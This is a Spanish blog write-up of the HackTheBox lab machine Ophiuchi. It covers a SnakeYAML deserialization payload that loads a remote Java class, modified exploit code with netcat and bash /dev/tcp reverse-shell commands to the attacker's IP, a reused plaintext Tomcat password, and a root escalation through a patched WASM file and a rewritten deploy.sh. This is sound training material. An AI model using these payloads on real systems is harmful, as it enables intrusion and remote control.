---
layout      : post
title       : "HackTheBox - Ophiuchi"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png
categories  : [ htb ]
tags        : [ webAssembly, deserialization, YAML, tomcat, go, reversing ]
---
Máquina Linux nivel medio. La **deserialización** no puede faltar, pero esta vez parseando sintaxis **YAML**. Enumeración básica y finalmente tendremos que jugar con instrucciones de **WebAssembly** para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitirá obtener una Shell como root.

![315ophiuchiHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315ophiuchiHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [felamos](https://www.hackthebox.eu/profile/27390).

Ejejeyyy ¿cómo estás?

Listoooos a darle, nos encontraremos con un analizador/parseador/formateador/etc de sintaxis **YAML**, buscando vulnerabilidades relacionadas a ese proceso, nos topamos con una deserialización en **SnakeYAML** que nos permite ejecución remota de comandos... Aprovechándonos de ella obtendremos una Shell como el usuario **tomcat**.

Enumerando la estructura base de **tomcat** tendremos el archivo `tomcat-users.xml`, donde obtendremos las credenciales del usuario **admin** hacia **tomcat**, pero reusándolas podremos tener ahora una sesión como **admin**.

Para la escalada, nos encontraremos con que **admin** puede ejecutar en la máquina mediante `sudo` un programa creado en el lenguaje de programación **Go**. En su contenido hay dos archivos que están siendo llamados de forma relativa, por lo que al ejecutar el programa los tomara de la ruta en la que estemos situados. Uno de ellos abarca **WebAssembly**, tendremos que modificar su ejecución para lograr correr el otro programa (`deploy.sh`). 

Para la modificación usaremos la herramienta [wabt](https://github.com/WebAssembly/wabt), jugaremos con archivos `.wasm` y `.wat`. Finalmente cambiamos el contenido de `deploy.sh` para que nos genere una Reverse Shell como el usuario **root**. 

A darle candela (:

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Tiene tintes de realidad.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral](#movimiento-lateral).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizaremos un escaneo de puertos para saber que servicios esta corriendo la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.227 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escaneamos todos los 65535 puertos.                     |
| --open     | Solo los puertos que estén abiertos.                    |
| -v         | Permite ver en consola lo que va encontrando (verbose). |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo. |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.227
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.227 ()   Status: Up
Host: 10.10.10.227 ()   Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///
# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 142.74 seconds
```

Perfecto, nos encontramos los servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Acceso remoto a servidores por medio de un canal seguro. |
| 8080   | **[HTTP Proxy](https://es.wikipedia.org/wiki/Servidor_proxy)**: Intermediario entre peticiones web. |

Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos información más detallada de cada uno:

```bash
❭ nmap -p 22,8080 -sC -sV 10.10.10.227 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos.                       |
| -sC       | Muestra todos los scripts relacionados con el servicio. |
| -sV       | Nos permite ver la versión del servicio.                |
| -oN       | Guarda el output en un archivo.                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,8080 -sC -sV -oN portScan 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.26 seconds
```

Bien, tenemos varias cositas:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 8080   | HTTP     | Apache Tomcat 9.0.38 |

Que destacamos:

**Puerto 8080:**

> **Apache Tomcat**: Contenedor de clases usadas para ampliar la capacidad de un servidor (servlets), que nos permite compilar y ejecutar aplicaciones web realizadas en **Java**.

* [Java Servlet - Wikipedia](https://es.wikipedia.org/wiki/Java_Servlet).
* [¿Qué es Apache Tomcat?](https://www.hostdime.com.ar/blog/que-es-apache-tomcat/).

Bueno, empecemos a validar cada servicio y ver por donde podemos jugar...

...

### Puerto 8080 [⌖](#puerto-8080) {#puerto-8080}

![315page8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315page8080.png)

Tenemos un analizador de formato [YAML](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html), interactuemos con él:

> **YAML (Yet Another Markup Language)**: Formato hecho para nosotros e.e Cosa que podamos facilmente leer lo que este pasando.

* [Desventajas, ventajas y uso de YAML](https://geeks.ms/jorge/2019/03/21/yaml-ventajas-desventajas-y-cuando-usarlo/).

Si agregamos cualquier cosa, nos redirecciona al apartado `Servlet`:

![315page8080_Servlet](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315page8080_Servlet.png)

Jmmm interesante, investiguemos como podemos interactuar con esto...

Bueno, leyendo sobre `YAML exploit` nos encontramos con un artículo muy llamativo hablando sobre deserialización insegura en él parseo de archivos `YAML`. Pero antes, que es deserialización rápidamente:

> Deserialización: Proceso por el cual pasan un conjunto de bytes para convertirse en un objeto entendible. La serialización seria pasar ese objeto a bytes para almacenarlos en memoria, a bases de datos, etc.

En la deserialización es donde esta la vulnerabilidad, ya que intentara pasar los bytes a objetos y ahí es donde podemos decirle que haga lo que queramos.

* [Deserialización insegura](https://seguridad-ofensiva.com/blog/owasp-top-10/owasp-top-8/).
* [Aprende que es deserialización insegura](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/).

Ahora, volviendo al artículo (dire mucho <<articulo>> en esta sección :P):

* [SnakeYaml Deserialization exploited](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858).

Nos habla de una deserialización insegura en la cual podemos conseguir **RCE** en la máquina que lo esté corriendo. Profundicemos en la explicación:

Básicamente es explotada cuando una página tiene la funcionalidad de parsear (formatear/analizar) un archivo o sintaxis `YAML`. Si el proceso directamente en el input genera él parseo llamando la función `yaml.load` sin previa sanitización, podemos conseguir ejecucion remota de comandos en el sistema. El artículo nos muestra como sería la definición de la función `yaml.load` en la lógica:

```java
Yaml yaml = new Yaml();
Object obj = yaml.load(<--user input data-->);
```

¿Pero como podemos validar que efectivamente podemos explotar esta deserialización? Bien, el creador del artículo uso un payload de un `pdf` el cual nos ayuda con esto:

```yml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

Primero debemos levantar un servidor web, usaré `Python`:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora en la web colocamos el payload, cambiamos nuestra IP y puerto y vemos si obtenemos alguna petición:

```yml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.51:8000/"]
  ]]
]
```

Obtenemos:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.227 - - [18/Feb/2021 12:12:12] code 404, message File not found
10.10.10.227 - - [18/Feb/2021 12:12:12] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

Bien, validamos que el payload funciona y podemos empezar a jugar para explotar esto. Vemos que esta intentando entrar a una ruta, pero al no tenerla en nuestra máquina, claramente recibe un código de estado `404`. 

...

## Explotación [#](#explotacion) {#explotacion}

Vale, el artículo nos redirecciona a los CVE respectivos de la vulnerabilidad:

* [CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution](https://nvd.nist.gov/vuln/detail/CVE-2017-1000207).
* [CVE-2017-1000208 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution](https://nvd.nist.gov/vuln/detail/CVE-2017-1000208).

> "The snake YAML has a feature which supports for a special syntax that allows the constructor of any Java class to be called when parsing YAML data which is `(!!<java class constructor>)`" [SnakeYaml Deserialization exploited](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858).

Perfecto, entonces al pasarle nuestro payload, `Snake YAML` llamara el constructor `ScriptEngineFactory` que hará una petición hacia nuestra máquina.

Para aprovecharnos de esto el artículo nos provee con un repositorio que genera payloads para ejecutar código en el sistema:

* [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload).

Entonces, despues de clonarnos el repo, vemos que ya tiene la estructura a la que el servidor intenta entrar: `/META-INF/services/javax.script.ScriptEngineFactory`.

```bash
❭ tree
.
├── artsploit
│   └── AwesomeScriptEngineFactory.java
└── META-INF
    └── services
        └── javax.script.ScriptEngineFactory

3 directories, 2 files
```

Entonces, la idea es que el exploit (`AwesomeScriptEngineFactory.java`) nos genere el payload (terminara en `.class` y estará junto al `.java`) para posteriormente desde la web hacer la petición a la que esta vez debería encontrar la ruta `/META-INF/...`, leerá el archivo `javax.script.ScriptEngineFactory` el cual por dentro apunta a nuestro payload (el `.class`) que sería ejecutado en el sistema :)

Modifiquemos el archivo `.java` para generar el `.class`. El original ejecuta una calculadora en `mac`:

```java
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
                                                
    public AwesomeScriptEngineFactory() {                                                       
        try {                        
            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator"); 
        } catch (IOException e) {               
            e.printStackTrace();                                                                
        }                               
    }
...
```

Cambiémoslo para que nos haga una petición hacia el puerto `4433` con `nc`:

```java
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("nc 10.10.14.51 4433");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
```

Ahora compilémoslo:

```bash
❭ javac AwesomeScriptEngineFactory.java
```

```bash
❭ ls 
AwesomeScriptEngineFactory.class  AwesomeScriptEngineFactory.java
```

* [¿Qué es un archivo **.class** en **Java**?](https://es.quora.com/En-Java-qu%C3%A9-es-un-archivo-class).

Nos ponemos en escucha en `Python` y en `nc`:

![315bash_listener_ncYpy](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_listener_ncYpy.png)

Ahora vamos a la web y volvemos a ejecutar el payload inicial que apunta hacia nuestra máquina. En nuestro servidor en `Python` recibimos:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.227 - - [18/Feb/2021 13:13:13] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
10.10.10.227 - - [18/Feb/2021 13:13:13] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
10.10.10.227 - - [18/Feb/2021 13:13:13] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
```

Perfecto y si esperamos un momento en nuestro listener de `nc` tenemos:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
10.10.10.227: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.51] from (UNKNOWN) [10.10.10.227] 48976
```

Vale vale, tamo bieeen. Tenemos ejecución remota de comandos en el sistema, intentemos ahora saber que usuario somos (además que nos sirve para validar si podemos ejecutar varios comandos sin problemas):

```java
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("id | nc 10.10.14.51 4433");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
```

Compilamos, escuchamos y ejecutamos en la web, en `Python` todo correctísimo, pero en `nc` no recibimos nada... Jugando con la sintaxis no logre nada, asi que podemos tomar el `Runtime.getRuntime().exec()` y buscar como ejecutar comandos en `linux` con él. Obtuvimos una charlita:

* [Stackoverflow - Java Exec Linux Command](https://stackoverflow.com/questions/12097095/java-exec-linux-command).

![315google_stackoverflow_java_linux_command](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315google_stackoverflow_java_linux_command.png)

Bien, probemos con esa sintaxis:

```java
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {

            String [] cmd = {
                "/bin/sh",
                "-c",
                "id | nc 10.10.14.51 4433"
            };

            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
```

Yyyyyyyyyyy:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
10.10.10.227: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.51] from (UNKNOWN) [10.10.10.227] 48990
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Perfecto (muchas gracias `@Randall` por tu respuesta de hace 9 años 😄), somos el usuario **tomcat**, ahora si intentemos generar una Reverse Shell:

*(Despues de algunas pruebas fallidas claramente)*

```bash
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {

            String [] cmd = {
                "/bin/sh",
                "-c",
                "bash -c 'bash -i >& /dev/tcp/10.10.14.51/4433 0>&1'"
            };

            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
```

Y obtenemos:

![315bash_revSH_tomcat](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_revSH_tomcat.png)

Perfectoooooooooooo, tamos dentro papachooooooooooooo.

Bueno, antes de seguir hagamos tratamiento de la TTY (Shell) para poder tener historial de comandos con las flechas, dar `CTRL + C` sin miedo y demás cositas, solo debemos escribir lo siguiente:

```bash
tomcat@ophiuchi:/$ script /dev/null -c bash
(CTRL + Z)
❭ stty raw -echo
❭ fg #(asi no lo veas se esta escribiendo)
        reset
Terminal type? xterm
tomcat@ophiuchi:/$ export TERM=xterm
tomcat@ophiuchi:/$ export SHELL=bash
tomcat@ophiuchi:/$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))
```

Y listo hemos hecho el tratamiento de la TTY perfectamente.

* [Savitar nos lo explica gráficamente en varios videos](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

...

## Movimiento lateral [#](#movimiento-lateral) {#movimiento-lateral}

Ahora si a enumerar... La flag de `user` esta en el `/home` del usuario `admin`, pero no tenemos acceso a verla aún:

```bash
tomcat@ophiuchi:~$ ls /home/
admin
tomcat@ophiuchi:~$ ls /home/admin/
user.txt
tomcat@ophiuchi:~$ cat /home/admin/user.txt 
cat: /home/admin/user.txt: Permission denied 
tomcat@ophiuchi:~$ 
```

Si recordamos la estructura de `tomcat` sabemos que existe un archivo donde a veces se almacenan las credenciales de los usuarios que manejen el servidor `tomcat`:

> Los nombres de usuario y las contraseñas cifradas se almacenan en el archivo tomcat-users.xml. Las actualizaciones tales como la creación de un usuario y el cambio de contraseñas de usuario o de los roles de permisos de repositorio se escriben automáticamente en archivo XML. [IBM - Gestion de usuarios Apache Tomcat](https://www.ibm.com/support/knowledgecenter/es/SSYMRC_6.0.4/com.ibm.jazz.install.doc/topics/c_plan_jazz_user_management.html)

Validando su existencia:

```bash
tomcat@ophiuchi:~$ ls -la conf/
total 240
drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .
drwxr-xr-x 9 root tomcat   4096 Oct 11 14:07 ..
-rw-r----- 1 root tomcat  12873 Sep 10 08:25 catalina.policy
-rw-r----- 1 root tomcat   7262 Sep 10 08:25 catalina.properties
-rw-r----- 1 root tomcat   1400 Sep 10 08:25 context.xml
-rw-r----- 1 root tomcat   1149 Sep 10 08:25 jaspic-providers.xml
-rw-r----- 1 root tomcat   2313 Sep 10 08:25 jaspic-providers.xsd
-rw-r----- 1 root tomcat   4144 Sep 10 08:25 logging.properties
-rw-r----- 1 root tomcat   7588 Sep 10 08:25 server.xml
-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml
-rw-r----- 1 root tomcat   2558 Sep 10 08:25 tomcat-users.xsd
-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web.xml
```

Perfecto, si lo vemos detalladamente tenemos una credencial:

```bash
...
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
...
```

Probemos esa contraseña hacia la máquina, quizás podamos reusarla:

```bash
tomcat@ophiuchi:~$ su admin
Password: 
admin@ophiuchi:/opt/tomcat$
```

Perfecto, somos el usuario `admin`, ahora si veamos como convertirnos en `root`...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Aprovechemos que tenemos la contraseña del usuario `admin` para migrarnos al servicio `SSH`:

```bash
❭ ssh admin@10.10.10.227
admin@10.10.10.227's password:             
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
...
```

Listo, mejor e.e

Validando que acciones puede llevar a cabo `admin` como `root` usando **sudo**, tenemos:

```bash
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

Vale vale valeee... Podemos ejecutar un programa llamado `index.go` usando el binario `/usr/bin/go` donde si empleamos **sudo** haremos el proceso como `root`. Juguemos a ver como podemos aprovechar esto.

```bash
admin@ophiuchi:/opt/wasm-functions$ ls -la
total 3928
drwxr-xr-x 3 root root    4096 Oct 14 19:52 .
drwxr-xr-x 5 root root    4096 Oct 14 09:56 ..
drwxr-xr-x 2 root root    4096 Oct 14 19:52 backup
-rw-r--r-- 1 root root      88 Oct 14 19:49 deploy.sh
-rwxr-xr-x 1 root root 2516736 Oct 14 19:52 index
-rw-rw-r-- 1 root root     522 Oct 14 19:48 index.go
-rwxrwxr-x 1 root root 1479371 Oct 14 19:41 main.wasm
```

Veamos el archivo que podemos ejecutar:

```bash
admin@ophiuchi:/opt/wasm-functions$ cat index.go 
```

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)

func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

Démosle un recorrido rápido para entender que esta haciendo:

> [Este ejemplo es parecido y más intuitivo - Simple example **Go WASM**](https://gist.github.com/Hywan/82ce861a6e03991d9f23f6a4172eb486).

***(Igual hay bastantes en internet, pueda que me explique fatal y no se entienda nada :P)***

<span style="color:red;">1. </span>Importa librerías y una en especial se trata de `/wasmer-go/wasmer`, la definición [propia del repositorio](https://github.com/wasmerio/wasmer) nos dice:

> Wasmer enables super lightweight containers based on WebAssembly that can run anywhere: from Desktop to the Cloud and IoT devices, and also embedded in any programming language.

Pero en este caso enfocado en `go` (**[wasmer-go](https://github.com/wasmerio/wasmer-go)**).

* [¿Qué es WebAssembly (**WASM**)?](https://pablomagaz.com/blog/empezando-con-webassembly).

> Basicamente es codigo nativo que el navegador va a entender a más bajo nivel.

<span style="color:red;">2. </span>El archivo `main.wasm` se obtiene de la [compilación de un objeto `.go`](https://parzibyte.me/blog/2019/05/29/webassembly-go-tutorial-ejemplos/). (Que en este caso, entiendo que no tenemos, ya que `index.go` es el que lo llama). **No tiene ruta absoluta, por lo tanto podemos aprovecharnos para crear el propio, ya que tomara el objeto de la ruta en la que estemos**.

* [Variables de declaración (`:=`) y asignación (`=`) en **Go**](https://www.digitalocean.com/community/tutorials/how-to-use-variables-and-constants-in-go-es).

<span style="color:red;">3. </span>Obtiene los bytes del binario y las demás variables que no usemos se guardaran en la nada. 

* [Blank Identifier (`_`) in **Go**](https://www.geeksforgeeks.org/what-is-blank-identifierunderscore-in-golang/).

<span style="color:red;">4. </span>De la instancia de **bytes** extraerá la data de `info` y la guardará en `init`.

<span style="color:red;">5. </span>Extrae el resultado (ahí realmente no sé que hace). Y lo guarda en formato `String()` sobre la variable `f`.

<span style="color:red;">6. </span>Simplemente válida si es diferente de `"1"`. Si no lo es, nos imprime `"Not ready to deploy"`, pero si es diferente de `"1"`.

<span style="color:red;">7. </span>Ejecuta el contenido del archivo `deploy.sh`. **Tampoco tiene ruta absoluta, el mismo juego que con el archivo `main.wasm`**.

```bash
admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
#!/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
```

Si ejecutamos la línea que podemos correr con `sudo` en esta ruta tenemos el siguiente mensaje:

```bash
admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

Quiere decir que la variable `f` esta con un valor distinto a `"1"`.

Lo curioso es que no tenemos manera de sobreescribir ningún archivo, o crear nuevos en ninguna de estas rutas. La carpeta `/backup` es intrigante, pero tiene los mismos archivos que `/wasm-functions` (bueno, falta el `index`, pero no podemos generarlo, indica que no encuentra la librería de la que ya hablamos antes). Asi que tamos F, a seguir pensando como podemos explotar esto o si es un `rabbit hole`...

Podemos destacar que el `"1"` que necesitamos para poder entrar a ejecutar el archivo `deploy.sh`, viene del binario `main.wasm`. Asi que de alguna manera debemos cambiarlo... Pensamos en `buffer overflow` para modificar el flujo pero jmm...

Bueno, despues de bastante rato perdido y sobre pensando las cosas, me fui para el foro y ahí me di cuenta de algo. Es un binario `wasm`, por lo tanto no es *human-readable*, si buscamos en internet como modificar un archivo `.wasm` nos [encontramos con una explicación bastante interesante](https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm). En una parte nombra la herramienta que usa: [wabt](https://github.com/WebAssembly/wabt).

La cual nos permite jugar con archivos `WASM` para transformarlos en formato `WAT` (muchas más cosas), que sería el formato **.txt** de los binarios, asi es más fácil de leer que esta haciendo el programa... Después de instalar la herramienta, podemos pasarnos el binario `main.wasm` a nuestra máquina y verlo en formato `.wat`:

```bash
❭ wabt/bin/wasm2wat main.wasm 
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

Bien, vemos el llamado a la función `info` (que es de donde obtenemos el valor distinto de `"1"`) y las demás definiciones, pero claramente a nosotros nos interesa jugar con `info`...

Si nos fijamos la definición sería tal que así:

```assembly
(func $info (type 0) (result i32) i32.const 0)
```

Donde tenemos una constante con valor `0`... Pues si nosotros estamos esperando un `1` podemos aprovechar esa línea para cambiarle el valor. Para modificar el archivo debemos guardarlo en formato `.wat` y despues volverlo a pasar a formato `.wasm`:

```bash
❭ wabt/bin/wasm2wat main.wasm -o main.wat
```

Modificamos la constante:

```bash
❭ cat main.wat 
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

Y ahora lo pasamos a formato `.wasm`:

```bash
❭ wabt/bin/wat2wasm main.wat -o main.wasm
```

Listo, antes de subirlo a la máquina. Creemos una carpeta temporal para poner nuestros objetos de trabajo, movamos ahí el archivo `deploy.sh` y modifiquémoslo para que nos entregue una Shell:

```bash
admin@ophiuchi:/dev/shm/test$ cat deploy.sh 
#!/bin/bash

/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
```

Ahora sí, subamos el binario y ejecutemos la instrucción `sudo`:

```bash
admin@ophiuchi:/dev/shm/test$ chmod + main.wasm 
admin@ophiuchi:/dev/shm/test$ ls
deploy.sh  main.wasm
admin@ophiuchi:/dev/shm/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

admin@ophiuchi:/dev/shm/test$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

Pero no nos ha cambiado... Aunque al menos sabemos que ya esta entrando a la ejecución (: Hagamos una Reverse Shell.

Nos ponemos en escucha por el puerto `4433` y modificamos el archivo `deploy.sh`:

```bash
admin@ophiuchi:/dev/shm/test$ cat deploy.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.51/4433 0>&1"

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
```

Y en el listener, obtenemos:

![315bash_revSH_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_revSH_root.png)

Perfectoooooo, tenemos una Shell como el usuario `root`.

Solo nos quedaría ver las flags:

![315flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315flags.png)

...

Bueno, la deserialización se esta volviendo mi ataque favorito. Esta en todos lados :P Mu gusto mucho el inicio, la escalada estuvo interesante, pero no sé, no me termino de gustar. Pero igual, todo es aprendizaje (:

Muchas gracias por pasarse y leer este montón de cosas, que tengas una feliz noche (: 

Y como siempre. A. Seguir. Rompiendo. Todo.